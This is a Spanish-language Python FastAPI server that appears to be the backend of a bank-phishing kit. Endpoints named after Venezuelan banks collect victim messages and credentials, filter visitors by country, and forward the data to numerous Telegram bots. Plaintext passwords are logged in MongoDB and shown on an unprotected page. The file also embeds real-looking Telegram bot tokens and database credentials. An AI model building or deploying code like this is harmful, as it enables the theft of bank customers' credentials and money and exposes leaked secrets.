from fastapi import FastAPI, HTTPException, Request, UploadFile
from fastapi import File, Form
from functools import partial
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import requests
from fastapi.responses import HTMLResponse
from collections import deque
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
from pymongo import MongoClient
from typing import Callable
from datetime import datetime, timedelta
import re
import httpx
import random

app = FastAPI()

# Configurar el middleware CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost", "*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)

TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"

app.get("/login", response_class=HTMLResponse)
async def login_form():
    return """
    <html>
    <head><title>Acceso</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:100px;">
        <h2>Ingrese la contraseña para acceder</h2>
        <form method="post" action="/login">
            <input type="password" name="password" placeholder="Contraseña" />
            <button type="submit">Ingresar</button>
        </form>
    </body>
    </html>
    """

@app.post("/login")
async def login(password: str = Form(...)):
    if password == "gato123":
        with open("static/panel.html", "r", encoding="utf-8") as f:
            content = f.read()
        return HTMLResponse(content=content)
    else:
        return HTMLResponse("<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", status_code=401)


# Configuración de autenticación
AUTH_USERNAME = "gato"
AUTH_PASSWORD = "Gato1234@"
numeros_r = [4, 6, 9]
iprandom = {4, 6, 9}

# MongoDB
client = MongoClient("mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd")
db = client["api_db"]
ip_numbers = db["ip_numbers"]
user_numbers = db["user_numbers"]
global_settings = db["global_settings"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]

# Inicializar base de datos si no existe
def init_db():
    # Crear índices únicos
    ip_numbers.create_index("ip", unique=True)
    user_numbers.create_index("username", unique=True)
    global_settings.create_index("id", unique=True)
    
    # Insertar configuración global por defecto si no existe
    if not global_settings.find_one({"id": 1}):
        global_settings.insert_one({"id": 1, "is_active": False})

# Funciones para interactuar con la base de datos

def agregar_elemento_diccionario(ip, numero):
    try:
        ip_numbers.insert_one({"ip": ip, "number": numero})
    except:
        # Si la IP ya existe, no hace nada
        pass

def usuariodiccionario(usuario, ip):
    # Buscar el número asociado a la IP
    ip_doc = ip_numbers.find_one({"ip": ip})
    
    if ip_doc:
        numero = ip_doc["number"]
        
        # Insertar o actualizar el usuario
        user_numbers.update_one(
            {"username": usuario},
            {"$set": {"username": usuario, "number": numero}},
            upsert=True
        )
        return {"usuario": usuario, "numero": numero}
    else:
        return {"error": "No se encontró un número asociado a la IP proporcionada."}

def obtener_numero(ip):
    doc = ip_numbers.find_one({"ip": ip})
    return doc["number"] if doc else None

def obtener_usuario(usuario):
    doc = user_numbers.find_one({"username": usuario})
    return doc["number"] if doc else None

def obtener_is_active():
    doc = global_settings.find_one({"id": 1})
    return bool(doc["is_active"]) if doc else False

def alternar_is_active():
    doc = global_settings.find_one({"id": 1})
    
    if doc:
        nuevo_valor = not doc["is_active"]
        global_settings.update_one(
            {"id": 1},
            {"$set": {"is_active": nuevo_valor}}
        )
        return nuevo_valor
    else:
        raise ValueError("No se encontró la configuración global.")

# Middleware para autenticación básica
class BasicAuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith("/docs") or request.url.path.startswith("/redoc"):
            auth = request.headers.get("Authorization")
            if not auth or not self._check_auth(auth):
                return Response("Unauthorized", status_code=401, headers={"WWW-Authenticate": "Basic"})
        response = await call_next(request)
        return response

    def _check_auth(self, auth: str) -> bool:
        try:
            scheme, credentials = auth.split()
            if scheme.lower() != "basic":
                return False
            decoded = base64.b64decode(credentials).decode("utf-8")
            username, password = decoded.split(":", 1)
            return username == AUTH_USERNAME and password == AUTH_PASSWORD
        except Exception:
            return False

app.add_middleware(BasicAuthMiddleware)

# Middleware de bloqueo de IP
class IPBlockMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = request.client.host

        # Revisar MongoDB en lugar del deque
        if ip_bloqueadas.find_one({"ip": client_ip}) :
            return JSONResponse(
                status_code=403,
                content={"detail": "Acceso denegado, la ip está bloqueada"}
            )

        # Si no está bloqueada, seguir normalmente
        if not (client_ip in iprandom):
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario(client_ip, numero_random)

        response = await call_next(request)
        return response

app.add_middleware(IPBlockMiddleware)

cola = deque(maxlen=20)
baneado = deque()
variable = False

# Función para contar cuántas veces aparece un elemento específico en la cola
def contar_elemento(cola, elemento):
    return cola.count(elemento)

def verificar_pais(ip):
    url = f"http://ipwhois.app/json/{ip}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            country = data.get('country_code', 'Unknown')
            if country in ['VE', 'CO', 'PE']:
                return True, country
            if country in ['US']:
                return False, country
            else:
                return True, country
        return False, 'Unknown'
    except Exception as e:
        raise HTTPException(status_code=500, detail="Error al verificar el país de la IP")

def enviar_telegram(mensaje, chat_id="-4826186479"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": mensaje 
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram")

def enviar_telegram2(mensaje, chat_id="-4592050775", token="7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": mensaje
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram 2")

def validar_contrasena(contrasena):
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    return bool(re.match(patron, contrasena))

class ClaveRequest(BaseModel):
    clave: str

@app.post("/validar_clave")
async def validar_clave(data: ClaveRequest):
    clave_correcta = "gato123"
    if data.clave == clave_correcta:
        return {"valido": True}
    else:
        return {"valido": False}

class UpdateNumberRequest(BaseModel):
    numero: int

def editar_numero_ip2(ip: str):
    result = ip_numbers.update_one(
        {"ip": ip},
        {"$set": {"number": 0}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
    
    return {"message": f"Número de la IP {ip} actualizado a 0"}

def editar_numero_usuario2(usuario: str):
    result = user_numbers.update_one(
        {"username": usuario},
        {"$set": {"number": 0}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
    
    return {"message": f"Número del usuario {usuario} actualizado a 0"}

class IPRequest(BaseModel):
    ip: str

@app.post("/bloquear_ip/")
async def bloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    
    if not ip_bloqueadas.find_one({"ip": ip}):
        ip_bloqueadas.insert_one({"ip": ip, "fecha_bloqueo": datetime.utcnow()})
        return {"message": f"La IP {ip} ha sido bloqueada y registrada en la base de datos."}
    else:
        return {"message": f"La IP {ip} ya estaba bloqueada."}


@app.post("/desbloquear_ip/")
async def desbloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    result = ip_bloqueadas.delete_one({"ip": ip})
    
    if result.deleted_count == 1:
        return {"message": f"La IP {ip} ha sido desbloqueada exitosamente."}
    else:
        return {"message": f"La IP {ip} no estaba bloqueada en la base de datos."}

@app.get("/ips_bloqueadas/")
async def obtener_ips_bloqueadas():
    bloqueadas = list(ip_bloqueadas.find({}, {"_id": 0}))
    return {"ips_bloqueadas": bloqueadas}

@app.get("/")
def read_root():
    return {"message": "API funcionando correctamente!"}

@app.post("/guardar_datos")
async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), request: Request = None):
    ip = request.client.host
    permitido, pais = verificar_pais(ip)

    logs_usuarios.insert_one({
        "usuario": usuario,
        "contrasena": contra,
        "ip": ip,
        "pais": pais,
        "fecha": datetime.utcnow()
    })
    
    return {
        "message": "Datos guardados correctamente",
        "ip": ip,
        "pais": pais
    }

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    registros = list(logs_usuarios.find().sort("fecha", -1))
    
    html = """
    <html>
    <head><title>Registros de Usuarios</title></head>
    <body>
        <h2>Listado de registros</h2>
        <table border="1">
            <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
    """
    for registro in registros:
        usuario = registro.get("usuario", "")
        contrasena = registro.get("contrasena", "")
        ip = registro.get("ip", "")
        pais = registro.get("pais", "")
        fecha = registro.get("fecha", "")
        html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip}</td><td>{pais}</td><td>{fecha}</td></tr>"
    
    html += "</table></body></html>"
    return HTMLResponse(content=html)

@app.get("/usuarios/")
async def obtener_usuarios():
    usuarios = list(user_numbers.find({}, {"_id": 0, "username": 1, "number": 1}))
    
    if not usuarios:
        return {"message": "No se encontraron usuarios en la base de datos."}
    
    return {"usuarios": [{"usuario": u["username"], "numero": u["number"]} for u in usuarios]}

@app.get("/is_active/")
async def obtener_estado_actual():
    estado = obtener_is_active()
    return {"is_active": estado}

@app.post("/toggle/")
async def alternar_estado():
    try:
        nuevo_estado = alternar_is_active()
        return {"message": "El valor de is_active se ha alternado exitosamente.", "is_active": nuevo_estado}
    except ValueError as e:
        return {"error": str(e)}

@app.get("/ips/")
async def obtener_ips():
    ips = list(ip_numbers.find({}, {"_id": 0, "ip": 1, "number": 1}))
    
    if not ips:
        return {"message": "No se encontraron IPs en la base de datos."}
    
    return {"ips": [{"ip": i["ip"], "numero": i["number"]} for i in ips]}

@app.put("/editar-ip/{ip}")
async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
    result = ip_numbers.update_one(
        {"ip": ip},
        {"$set": {"number": request_data.numero}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
    
    return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}

@app.put("/editar-usuario/{usuario}")
async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
    result = user_numbers.update_one(
        {"username": usuario},
        {"$set": {"number": request_data.numero}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
    
    return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}

def clear_db():
    ip_numbers.delete_many({})
    user_numbers.delete_many({})

def agregar_elemento(cola, elemento):
    cola.append(elemento)

# Configuración de endpoints dinámicos
endpoint_configs = [
    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
]

@app.post("/verificar_spam_ip")
async def verificar_spam_ip(data: IPRequest):
    ip = data.ip.strip()
    agregar_elemento(cola, ip)
    repeticiones = contar_elemento(cola, ip)

    if repeticiones > 8:
        if ip not in baneado:
            baneado.append(ip)
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": True,
            "mensaje": "IP detectada como spam y bloqueada"
        }
    else:
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": False,
            "mensaje": "IP aún no considerada spam"
        }

class DynamicMessage(BaseModel):
    mensaje: str

async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request: Request):
    client_ip = request.client.host
    agregar_elemento(cola, client_ip)
    numeror = obtener_numero(client_ip)

    if contar_elemento(cola, client_ip) > 8:
        baneado.append(client_ip)
        raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")

    permitido, pais = verificar_pais(client_ip)
    mensaje = request_data.mensaje

    if permitido and pais != "US":
        if config["path"].startswith("/bdv") and obtener_is_active() and (numeror in numeros_r and pais != "US" and pais != "CO"):
            enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']} Todo tuyo", "-4931572577")
        else:
            enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']}")
            enviar_telegram2(mensaje, config["chat_id"], config["bot_id"])

        return {"mensaje_enviado": True}
    else:
        raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")

for config in endpoint_configs:
    app.add_api_route(
        path=config["path"],
        endpoint=partial(handle_dynamic_endpoint, config),
        methods=["POST"]
    )

@app.post('/clear_db')
def clear_db_endpoint():
    try:
        clear_db()
        return {"message": "Se borró correctamente"}
    except Exception as e:
        return {"message": "No se borró"}

# Inicializar la base de datos
init_db()